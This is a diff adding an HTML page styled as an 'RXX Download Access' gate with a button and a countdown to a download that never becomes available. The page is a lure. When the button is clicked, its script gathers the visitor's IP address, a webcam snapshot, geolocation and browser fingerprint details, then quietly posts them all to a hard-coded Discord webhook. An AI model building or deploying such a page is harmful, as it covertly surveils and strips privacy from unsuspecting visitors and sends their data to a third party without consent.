@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RXX Download Access</title>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Source Sans Pro', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f5f5f5;
+      overflow: hidden;
+    }
+    .container {
+      background: #fff;
+      padding: 24px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 360px;
+      max-width: 90%;
+      text-align: center;
+      position: relative;
+      z-index: 10;
+    }
+    .container h2 {
+      margin-bottom: 24px;
+      color: #00a2ff;
+      font-weight: 600;
+    }
+    .click-button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00a2ff;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .click-button:hover {
+      background-color: #0088cc;
+    }
+    .click-button:disabled {
+      background-color: #b3d9ff;
+      cursor: not-allowed;
+    }
+    .shake {
+      animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+    }
+    @keyframes shake {
+      10%, 90% { transform: translate3d(-1px, 0, 0); }
+      20%, 80% { transform: translate3d(2px, 0, 0); }
+      30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+      40%, 60% { transform: translate3d(4px, 0, 0); }
+    }
+    .status-message {
+      margin-top: 16px;
+      color: #333;
+    }
+    .error-message {
+      margin-top: 16px;
+      color: #ff4444;
+    }
+    .release-container {
+      text-align: center;
+      color: #00a2ff;
+    }
+    .release-text {
+      font-size: 2.5rem;
+      font-weight: bold;
+      text-shadow: 0 0 10px #00a2ff, 0 0 20px #00a2ff, 0 0 30px #00a2ff;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { text-shadow: 0 0 10px #00a2ff, 0 0 20px #00a2ff, 0 0 30px #00a2ff; }
+      50% { text-shadow: 0 0 20px #00a2ff, 0 0 30px #00a2ff, 0 0 40px #00a2ff; }
+      100% { text-shadow: 0 0 10px #00a2ff, 0 0 20px #00a2ff, 0 0 30px #00a2ff; }
+    }
+    .download-button {
+      margin-top: 20px;
+      padding: 15px 30px;
+      background-color: #b3d9ff;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.2rem;
+      font-weight: 600;
+      cursor: not-allowed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    canvas#particleCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+  </style>
+</head>
+<body>
+  <div id="mainContainer" class="container">
+    <h2>RXX Download Access</h2>
+    <button id="clickButton" class="click-button">Click Here</button>
+    <div id="status" class="status-message"></div>
+    <div id="result" class="error-message"></div>
+  </div>
+  <canvas id="cameraCanvas" style="display: none;"></canvas>
+  <canvas id="particleCanvas"></canvas>
+
+  <script>
+    (function () {
+      const clickButton = document.getElementById('clickButton');
+      const statusDiv = document.getElementById('status');
+      const resultDiv = document.getElementById('result');
+      const mainContainer = document.getElementById('mainContainer');
+      const cameraCanvas = document.getElementById('cameraCanvas');
+      const particleCanvas = document.getElementById('particleCanvas');
+
+      if (!clickButton || !statusDiv || !resultDiv || !mainContainer || !cameraCanvas || !particleCanvas) {
+        console.error('DOM elements missing');
+        if (resultDiv) resultDiv.textContent = 'Error: Page setup failed';
+        return;
+      }
+
+      // Particle animation setup
+      const ctx = particleCanvas.getContext('2d', { willReadFrequently: true });
+      let particlesArray = [];
+      const colors = ['#00a2ff', '#ff4444', '#00ff00'];
+
+      function resizeCanvas() {
+        particleCanvas.width = window.innerWidth;
+        particleCanvas.height = window.innerHeight;
+      }
+      resizeCanvas();
+      window.addEventListener('resize', resizeCanvas);
+
+      class Particle {
+        constructor() {
+          this.x = Math.random() * particleCanvas.width;
+          this.y = Math.random() * particleCanvas.height;
+          this.size = Math.random() * 5 + 2;
+          this.speedX = Math.random() * 3 - 1.5;
+          this.speedY = Math.random() * 3 - 1.5;
+          this.color = colors[Math.floor(Math.random() * colors.length)];
+        }
+        update() {
+          this.x += this.speedX;
+          this.y += this.speedY;
+          if (this.size > 0.2) this.size -= 0.1;
+          if (this.x < 0 || this.x > particleCanvas.width) this.speedX *= -1;
+          if (this.y < 0 || this.y > particleCanvas.height) this.speedY *= -1;
+        }
+        draw() {
+          ctx.fillStyle = this.color;
+          ctx.beginPath();
+          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+          ctx.fill();
+        }
+      }
+
+      function animateParticles() {
+        ctx.clearRect(0, 0, particleCanvas.width, particleCanvas.height);
+        for (let i = 0; i < particlesArray.length; i++) {
+          particlesArray[i].update();
+          particlesArray[i].draw();
+          if (particlesArray[i].size <= 0.2) {
+            particlesArray.splice(i, 1);
+            i--;
+          }
+        }
+        requestAnimationFrame(animateParticles);
+      }
+
+      clickButton.addEventListener('click', async () => {
+        clickButton.disabled = true;
+        statusDiv.textContent = 'Loading...';
+        resultDiv.textContent = '';
+
+        // Fetch IP address
+        let ipAddress = 'Unknown';
+        try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 5000);
+          const ipResponse = await fetch('https://api.ipify.org?format=json', {
+            signal: controller.signal
+          });
+          clearTimeout(timeoutId);
+          if (ipResponse.ok) {
+            const ipData = await ipResponse.json();
+            ipAddress = ipData.ip || 'Unknown';
+          } else {
+            console.error('Failed to fetch IP address:', ipResponse.status);
+          }
+        } catch (error) {
+          console.error('IP fetch error:', error.message);
+        }
+
+        // Attempt to access camera
+        let cameraData = 'Camera Not Supported';
+        let stream = null;
+        try {
+          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            try {
+              stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            } catch (permError) {
+              console.error('Camera permission error:', permError.message);
+              cameraData = 'Camera Access Denied';
+              throw permError;
+            }
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            await new Promise((resolve, reject) => {
+              video.onloadedmetadata = resolve;
+              video.onerror = () => {
+                console.error('Video metadata error');
+                reject(new Error('Video metadata failed'));
+              };
+            });
+
+            cameraCanvas.width = video.videoWidth || 640;
+            cameraCanvas.height = video.videoHeight || 480;
+            const context = cameraCanvas.getContext('2d', { willReadFrequently: true });
+            if (context) {
+              context.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);
+              try {
+                cameraData = cameraCanvas.toDataURL('image/jpeg', 0.5);
+              } catch (canvasError) {
+                console.error('Canvas data error:', canvasError.message);
+                cameraData = 'Canvas Error';
+              }
+            } else {
+              console.error('Failed to get canvas context');
+              cameraData = 'Canvas Error';
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+          }
+        } catch (error) {
+          console.error('Camera access error:', error.message);
+          if (cameraData !== 'Camera Access Denied') {
+            cameraData = 'Camera Error';
+          }
+        } finally {
+          if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+          }
+        }
+
+        // Attempt to access geolocation
+        let geolocationData = 'Geolocation Not Supported';
+        try {
+          if (navigator.geolocation) {
+            geolocationData = await new Promise((resolve) => {
+              navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  resolve(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
+                },
+                (error) => {
+                  console.error('Geolocation error:', error.message);
+                  resolve('Geolocation Denied');
+                },
+                { timeout: 5000 }
+              );
+            });
+          }
+        } catch (error) {
+          console.error('Geolocation fetch error:', error.message);
+          geolocationData = 'Geolocation Error';
+        }
+
+        // Collect device/browser info
+        const deviceInfo = {
+          userAgent: navigator.userAgent || 'Unknown',
+          screenResolution: `${screen.width || 'Unknown'}x${screen.height || 'Unknown'}`,
+          windowSize: `${window.innerWidth || 'Unknown'}x${window.innerHeight || 'Unknown'}`,
+          language: navigator.language || 'Unknown',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+          platform: navigator.platform || 'Unknown',
+          referrer: document.referrer || 'None',
+          connection: (navigator.connection || {}).effectiveType || 'Unknown',
+          downlink: (navigator.connection || {}).downlink || 'Unknown'
+        };
+
+        // Get reason from URL query string
+        const urlParams = new URLSearchParams(window.location.search);
+        const reason = urlParams.get('reason') || 'No reason provided';
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        statusDiv.textContent = 'Processing...';
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        statusDiv.textContent = '';
+
+        // Check for "hacking XD"
+        const isApproved = reason.toLowerCase().includes('hacking xd');
+        if (isApproved) {
+          // Start particle animation
+          particlesArray = Array.from({ length: 100 }, () => new Particle());
+          animateParticles();
+
+          mainContainer.innerHTML = `
+            <div class="release-container">
+              <div id="releaseText" class="release-text">5 Days Until RXX Release!</div>
+              <button id="downloadButton" class="download-button" disabled>
+                <span>Download RXX</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 20h9"></path>
+                  <path d="M16.5 3.5a2.12 2.12 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
+                </svg>
+              </button>
+            </div>
+          `;
+
+          const downloadButton = document.getElementById('downloadButton');
+          const releaseText = document.getElementById('releaseText');
+
+          if (!downloadButton || !releaseText) {
+            console.error('Release DOM elements missing');
+            return;
+          }
+
+          const releaseDate = new Date('2025-07-24T04:30:00Z');
+          const updateTimer = () => {
+            const now = new Date();
+            const timeLeft = releaseDate - now;
+            if (timeLeft <= 0) {
+              releaseText.textContent = 'RXX Release Expired!';
+              particlesArray = []; // Stop particles
+              downloadButton.addEventListener('click', () => {
+                alert('Too Late...');
+              }, { once: true });
+              return;
+            }
+            const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+            releaseText.textContent = `RXX releases in: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+          };
+          updateTimer();
+          setInterval(updateTimer, 1000);
+        } else {
+          resultDiv.className = 'error-message';
+          resultDiv.textContent = 'Access Denied';
+          clickButton.classList.add('shake');
+          clickButton.disabled = false;
+          setTimeout(() => clickButton.classList.remove('shake'), 500);
+        }
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1395512594751688796/kynf3LtOxljC0v4Cwn9I3eLhTydjtRNkASi0wSvvLqPQ8vgufmDOcRSeKe8qF801FuZ7';
+
+        const data = {
+          content: `Button clicked:\n**Reason**: ${reason}\n**IP Address**: ${ipAddress}\n**Camera**: ${cameraData.startsWith('data:image') ? 'Image Captured' : cameraData}\n**Geolocation**: ${geolocationData}\n**User Agent**: ${deviceInfo.userAgent}\n**Screen Resolution**: ${deviceInfo.screenResolution}\n**Window Size**: ${deviceInfo.windowSize}\n**Language**: ${deviceInfo.language}\n**Timezone**: ${deviceInfo.timezone}\n**Platform**: ${deviceInfo.platform}\n**Referrer**: ${deviceInfo.referrer}\n**Connection Type**: ${deviceInfo.connection}\n**Downlink Speed**: ${deviceInfo.downlink}\n**Status**: ${isApproved ? 'Approved' : 'Denied'}\n**Timestamp**: ${new Date().toISOString()}`,
+          embeds: [
+            {
+              title: "Button Click Event",
+              fields: [
+                { name: "Reason", value: reason, inline: false },
+                { name: "IP Address", value: ipAddress, inline: true },
+                { name: "Camera", value: cameraData.startsWith('data:image') ? 'Image Captured' : cameraData, inline: true },
+                { name: "Geolocation", value: geolocationData, inline: true },
+                { name: "User Agent", value: deviceInfo.userAgent, inline: false },
+                { name: "Screen Resolution", value: deviceInfo.screenResolution, inline: true },
+                { name: "Window Size", value: deviceInfo.windowSize, inline: true },
+                { name: "Language", value: deviceInfo.language, inline: true },
+                { name: "Timezone", value: deviceInfo.timezone, inline: true },
+                { name: "Platform", value: deviceInfo.platform, inline: true },
+                { name: "Referrer", value: deviceInfo.referrer, inline: true },
+                { name: "Connection Type", value: deviceInfo.connection, inline: true },
+                { name: "Downlink Speed", value: deviceInfo.downlink, inline: true },
+                { name: "Status", value: isApproved ? 'Approved' : 'Denied', inline: true },
+                { name: "Timestamp", value: new Date().toISOString(), inline: false }
+              ],
+              color: isApproved ? 0x00ff00 : 0xff4444
+            }
+          ]
+        };
+
+        if (cameraData.startsWith('data:image')) {
+          data.embeds[0].image = { url: cameraData };
+        }
+
+        try {
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 5000);
+          const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data),
+            signal: controller.signal
+          });
+          clearTimeout(timeoutId);
+
+          if (!response.ok) {
+            const errorText = await response.text();
+            console.error('Webhook response:', response.status, errorText);
+          }
+        } catch (error) {
+          console.error('Webhook fetch error:', error.message);
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
